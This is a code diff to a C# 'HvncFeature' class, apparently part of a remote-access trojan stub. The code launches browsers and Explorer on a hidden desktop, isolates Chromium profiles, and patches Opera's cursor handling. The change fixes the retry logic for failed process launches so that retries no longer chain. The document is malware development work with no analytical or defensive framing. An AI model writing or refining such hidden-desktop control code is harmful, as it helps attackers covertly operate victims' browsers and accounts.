@@ -305,7 +305,7 @@ internal static class HvncFeature
 
     // These apps support multiple windows — always launch a new instance (skip PID-alive check).
     private static readonly HashSet<string> _multiInstance = new(StringComparer.OrdinalIgnoreCase)
-        { "explorer.exe", "cmd.exe", "notepad.exe" };
+        { "cmd.exe", "notepad.exe" };
 
     // Chromium-based browsers share a profile lock — give each HVNC instance its own data dir.
     private static readonly HashSet<string> _chromiumBrowsers = new(StringComparer.OrdinalIgnoreCase)
@@ -1652,7 +1652,7 @@ internal static class HvncFeature
         return 0;
     }
 
-    private static void LaunchOnDesktop(string path)
+    private static void LaunchOnDesktop(string path, bool isRetry = false)
     {
         if (_hDesktop == 0) return;
         try
@@ -1820,8 +1820,9 @@ internal static class HvncFeature
             if (pi.dwProcessId != 0) _launchedPids[exeBase] = pi.dwProcessId;
             if (pi.dwProcessId != 0 && exeBase == "opera.exe")    PatchCursorInfoAsync(pi.dwProcessId);
             if (pi.dwProcessId != 0 && exeBase == "explorer.exe") SuppressMscoriesAsync(pi.dwProcessId);
-            // If Edge or Explorer exits within 3 s (failed startup), retry once automatically
-            if (pi.dwProcessId != 0 && exeBase is "msedge.exe" or "explorer.exe")
+            // If Edge or Explorer exits within 3 s (failed startup), retry once automatically.
+            // isRetry guard prevents chaining: the retry itself never schedules another retry.
+            if (!isRetry && pi.dwProcessId != 0 && exeBase is "msedge.exe" or "explorer.exe")
             {
                 var retryPid = pi.dwProcessId; var retryBase = exeBase; var retryPath = path;
                 Task.Run(async () =>
@@ -1830,7 +1831,7 @@ internal static class HvncFeature
                     if (_hDesktop == 0 || IsProcessAlive(retryPid)) return;
                     StubLog.Info($"[HVNC] '{retryBase}' exited in <3 s — retrying once");
                     _launchedPids.TryRemove(retryBase, out _);
-                    LaunchOnDesktop(retryPath);
+                    LaunchOnDesktop(retryPath, isRetry: true);
                 });
             }
             if (pi.hProcess != 0) CloseHandle(pi.hProcess);
